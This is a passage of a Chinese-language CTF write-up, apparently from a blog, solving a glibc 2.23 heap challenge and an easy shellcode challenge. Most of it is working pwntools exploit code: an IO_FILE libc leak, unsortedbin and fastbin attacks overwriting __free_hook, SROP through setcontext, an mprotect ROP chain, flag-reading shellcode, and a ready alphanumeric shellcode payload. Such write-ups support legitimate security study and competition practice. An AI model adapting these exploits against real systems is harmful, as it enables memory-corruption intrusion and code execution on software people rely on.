data-url="aHR0cHM6Ly9jdGYtd2lraS5naXRodWIuaW8vY3RmLXdpa2kvcHduL2xpbnV4L3N0YWNrb3ZlcmZsb3cvYWR2YW5jZWQtcm9wLXpoLyNzcm9w" title="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop">SROP攻击<i class="fa fa-external-link"></i></span></p><h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><h4 id="准备部分"><a href="#准备部分" class="headerlink" title="准备部分"></a>准备部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your Choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">"Please input size: "</span>, str(size))</span><br><span class="line">    <span class="keyword">if</span> len(content) == (size+<span class="number">1</span>):</span><br><span class="line">        sa(<span class="string">"Please input content: "</span>, content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">"Please input content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">"Please input idx: "</span>, str(idx))</span><br><span class="line">    sa(<span class="string">"Please input content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">"Please input idx: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><h4 id="IO-file攻击"><a href="#IO-file攻击" class="headerlink" title="IO_file攻击"></a>IO_file攻击</h4><p>这部分就是通过溢出，修改size,然后free掉一个fake的，最后通过IO_file攻击泄露地址，<br>这部分我是拿的ex师傅的部分的，我自己也写了个这部分的，利用chunk extends，搞复杂了，那会，感觉这个简洁些</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="number">0x68</span>, <span class="string">'1'</span>) <span class="comment">#0</span></span><br><span class="line">new(<span class="number">0x78</span>, <span class="string">'2'</span>) <span class="comment">#1</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">new(<span class="number">0x68</span>, payload*<span class="number">6</span>) <span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x68</span>, payload*<span class="number">6</span>) <span class="comment">#3</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">'a'</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p8(<span class="number">0xf1</span>)) <span class="comment">#0</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="number">0x78</span>, <span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">'a'</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p8(<span class="number">0xa1</span>)) <span class="comment">#0</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">new(<span class="number">0x98</span>, <span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p16(<span class="number">0x8620</span><span class="number">-0x40</span><span class="number">-0x3</span>))</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">'\n'</span>) <span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">'\x00'</span>*<span class="number">0x33</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> ) <span class="comment">#3</span></span><br><span class="line">r(<span class="number">0x88</span>)</span><br><span class="line">libc.address = uu64(r(<span class="number">8</span>)) - libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line">lg(<span class="string">"libc.addressess"</span>, libc.address)</span><br></pre></td></tr></table></figure><h4 id="unsortedbin攻击"><a href="#unsortedbin攻击" class="headerlink" title="unsortedbin攻击"></a>unsortedbin攻击</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">'__free_hook'</span>]<span class="number">-0x20</span>))</span><br><span class="line">new(<span class="number">0x88</span>, <span class="string">'2'</span>) <span class="comment">#2</span></span><br></pre></td></tr></table></figure><h4 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h4><p>这里有个点点一下，就是srop部分，因为setcontext最后一句xor eax,eax，再加上syscall就是相当于调用read,<br>rdi 第一个参数 fd<br>rsi 第二个参数 buf<br>rdx 第三个参数 count 大小<br>rsp 执行完后的rsp<br>rip 就是 执行syscall加ret</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(libc.symbols[<span class="string">'__free_hook'</span>]<span class="number">-0x13</span>))</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">0</span> <span class="comment"># fd为0</span></span><br><span class="line">frame.rsi = (libc.symbols[<span class="string">'__free_hook'</span>]) &amp; <span class="number">0xfffffffffffff000</span> <span class="comment">#</span></span><br><span class="line">frame.rdx = <span class="number">0x2000</span></span><br><span class="line">frame.rsp = (libc.symbols[<span class="string">'__free_hook'</span>]) &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">frame.rip = libc.address + <span class="number">0x00000000000bc375</span> <span class="comment">#: syscall; ret; </span></span><br><span class="line">payload = str(frame)</span><br><span class="line">new(<span class="number">0x68</span>, payload[<span class="number">0x80</span>:<span class="number">0x80</span>+<span class="number">0x60</span>])</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">'\x00'</span>*<span class="number">3</span> + p64(libc.symbols[<span class="string">'setcontext'</span>]+<span class="number">53</span>))</span><br><span class="line">edit(<span class="number">1</span>, payload[:<span class="number">0x98</span>])</span><br></pre></td></tr></table></figure><h4 id="mprotect修改内存页权限"><a href="#mprotect修改内存页权限" class="headerlink" title="mprotect修改内存页权限"></a>mprotect修改内存页权限</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"> layout = [</span><br><span class="line">     libc.address + <span class="number">0x0000000000021102</span>, <span class="comment">#: pop rdi; ret; </span></span><br><span class="line">     libc.symbols[<span class="string">'__free_hook'</span>] &amp; <span class="number">0xfffffffffffff000</span>, <span class="comment"># 开始地址</span></span><br><span class="line">     libc.address + <span class="number">0x00000000000202e8</span>, <span class="comment">#: pop rsi; ret; </span></span><br><span class="line">     <span class="number">0x2000</span>, <span class="comment"># 空间大小</span></span><br><span class="line">     libc.address + <span class="number">0x0000000000001b92</span>, <span class="comment">#: pop rdx; ret;  </span></span><br><span class="line">     <span class="number">7</span>, <span class="comment"># rwx可读可写可执行</span></span><br><span class="line">     libc.address + <span class="number">0x0000000000033544</span>, <span class="comment">#: pop rax; ret; </span></span><br><span class="line">     <span class="number">10</span>, <span class="comment">#mprotect调用号</span></span><br><span class="line">     libc.address + <span class="number">0x00000000000bc375</span>, <span class="comment">#: syscall; ret;</span></span><br><span class="line">     libc.address + <span class="number">0x0000000000002a71</span>, <span class="comment">#: jmp rsp; </span></span><br><span class="line"> ]</span><br></pre></td></tr></table></figure><h4 id="shellcode-jmp-rsp"><a href="#shellcode-jmp-rsp" class="headerlink" title="shellcode jmp rsp"></a>shellcode jmp rsp</h4><p>第一份shellcode ex师傅的<br>第二份用pwntools加自己编写一些<br>第三份纯自己写一遍</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    mov eax, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 0x100</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edx, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov eax, edi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line">    shellcode = shellcraft.amd64.open(<span class="string">'flag'</span>)</span><br><span class="line">    shellcode += <span class="string">'''</span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 0x100</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov edx,0x100</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">    '''</span>)</span><br></pre></td></tr></table></figure><h4 id="getshell走起"><a href="#getshell走起" class="headerlink" title="getshell走起"></a>getshell走起</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s(flat(layout) + shellcode)</span><br></pre></td></tr></table></figure><p>。。。好像不能啊,只能特么的读flag，没意思</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'192.168.150.135'</span> </span><br><span class="line">port = <span class="number">10001</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">exe = <span class="string">'/tmp/tmp.97OiO1SVl1/pwn'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> s,addr          : io.success(<span class="string">'\033[1;31;40m%20s--&gt;0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="comment"># RUNPATH:  '/usr/lib/glibc/2.23-0ubuntu10_amd64/'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your Choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">"Please input size: "</span>, str(size))</span><br><span class="line">    <span class="keyword">if</span> len(content) == (size+<span class="number">1</span>):</span><br><span class="line">        sa(<span class="string">"Please input content: "</span>, content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">"Please input content: "</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">"Please input idx: "</span>, str(idx))</span><br><span class="line">    sa(<span class="string">"Please input content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">"Please input idx: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">'1'</span>) <span class="comment">#0</span></span><br><span class="line">    new(<span class="number">0x78</span>, <span class="string">'2'</span>) <span class="comment">#1</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">    new(<span class="number">0x68</span>, payload*<span class="number">6</span>) <span class="comment">#2</span></span><br><span class="line">    new(<span class="number">0x68</span>, payload*<span class="number">6</span>) <span class="comment">#3</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">'a'</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p8(<span class="number">0xf1</span>)) <span class="comment">#0</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    new(<span class="number">0x78</span>, <span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">'a'</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p8(<span class="number">0xa1</span>)) <span class="comment">#0</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">0x98</span>, <span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p16(<span class="number">0x8620</span><span class="number">-0x40</span><span class="number">-0x3</span>))</span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">'\n'</span>) <span class="comment">#2</span></span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">'\x00'</span>*<span class="number">0x33</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> ) <span class="comment">#3</span></span><br><span class="line">    r(<span class="number">0x88</span>)</span><br><span class="line">    libc.address = uu64(r(<span class="number">8</span>)) - libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line">    lg(<span class="string">"libc.addressess"</span>, libc.address)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">'__free_hook'</span>]<span class="number">-0x20</span>))</span><br><span class="line">    new(<span class="number">0x88</span>, <span class="string">'2'</span>) <span class="comment">#2</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(libc.symbols[<span class="string">'__free_hook'</span>]<span class="number">-0x13</span>))</span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rdi = <span class="number">0</span></span><br><span class="line">    frame.rsi = (libc.symbols[<span class="string">'__free_hook'</span>]) &amp; <span class="number">0xfffffffffffff000</span> <span class="comment">#</span></span><br><span class="line">    frame.rdx = <span class="number">0x2000</span></span><br><span class="line">    frame.rsp = (libc.symbols[<span class="string">'__free_hook'</span>]) &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">    frame.rip = libc.address + <span class="number">0x00000000000bc375</span> <span class="comment">#: syscall; ret; </span></span><br><span class="line">    payload = str(frame)</span><br><span class="line">    new(<span class="number">0x68</span>, payload[<span class="number">0x80</span>:<span class="number">0x80</span>+<span class="number">0x60</span>])</span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">'\x00'</span>*<span class="number">3</span> + p64(libc.symbols[<span class="string">'setcontext'</span>]+<span class="number">53</span>))</span><br><span class="line">    edit(<span class="number">1</span>, payload[:<span class="number">0x98</span>])</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    layout = [</span><br><span class="line">        libc.address + <span class="number">0x0000000000021102</span>, <span class="comment">#: pop rdi; ret; </span></span><br><span class="line">        libc.symbols[<span class="string">'__free_hook'</span>] &amp; <span class="number">0xfffffffffffff000</span>,</span><br><span class="line">        libc.address + <span class="number">0x00000000000202e8</span>, <span class="comment">#: pop rsi; ret; </span></span><br><span class="line">        <span class="number">0x2000</span>,</span><br><span class="line">        libc.address + <span class="number">0x0000000000001b92</span>, <span class="comment">#: pop rdx; ret; </span></span><br><span class="line">        <span class="number">7</span>,</span><br><span class="line">        libc.address + <span class="number">0x0000000000033544</span>, <span class="comment">#: pop rax; ret; </span></span><br><span class="line">        <span class="number">10</span>,</span><br><span class="line">        libc.address + <span class="number">0x00000000000bc375</span>, <span class="comment">#: syscall; ret; </span></span><br><span class="line">        libc.address + <span class="number">0x0000000000002a71</span>, <span class="comment">#: jmp rsp; </span></span><br><span class="line">    ]</span><br><span class="line">    shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    mov eax, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 0x100</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edx, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov eax, edi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line">    shellcode = shellcraft.amd64.open(<span class="string">'flag'</span>)</span><br><span class="line">    shellcode += <span class="string">'''</span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 0x100</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov edx,0x100</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line">    <span class="comment">#shellcode = asm(shellcode, arch='amd64')</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    s(flat(layout) + shellcode)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#libc.address = uu64(r(8)) - libc.symbols['__IO_2_1_stdin_']</span></span><br><span class="line">    <span class="comment">#lg("libc.address", libc.address)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            exp()</span><br><span class="line">            io.interactive()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            io.close()</span><br><span class="line">            io = process(exe)</span><br></pre></td></tr></table></figure><h2 id="easyshellcode"><a href="#easyshellcode" class="headerlink" title="easyshellcode"></a>easyshellcode</h2><p>这个没啥好说的，用工具或者别的都行</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'./pwn'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    buf = <span class="string">"PPYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXA"</span></span><br><span class="line">    s(buf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="easystack"><a href="#easystack" class="headerlink" 